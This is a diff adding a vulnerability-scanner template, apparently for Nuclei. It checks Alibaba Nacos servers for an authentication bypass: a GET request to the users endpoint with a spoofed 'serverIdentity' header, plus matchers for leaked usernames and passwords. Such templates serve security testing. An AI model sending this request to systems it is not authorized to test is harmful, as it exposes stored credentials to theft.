@@ -1,0 +1,26 @@
+id: alibaba-nacos-noauth-bypass
+info:
+  name: Alibaba Nacos Server Identity Unauthorized Access Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+  description: |
+    Alibaba Nacos server is vulnerable to an unauthorized access bypass, allowing attackers to retrieve sensitive user information such as usernames and passwords.
+http:
+  - method: GET
+    path:
+      - "/nacos/v1/auth/users?pageNo=1&pageSize=10&search=accurate&accessToken="
+    headers:
+      serverIdentity: security
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: regex
+        regex:
+          - "\"totalCount\""
+          - "\"pageItems\""
+          - "\"username\":\"([0-9a-zA-Z]+)\""
+          - "\"password\":\"(\\S+)\""
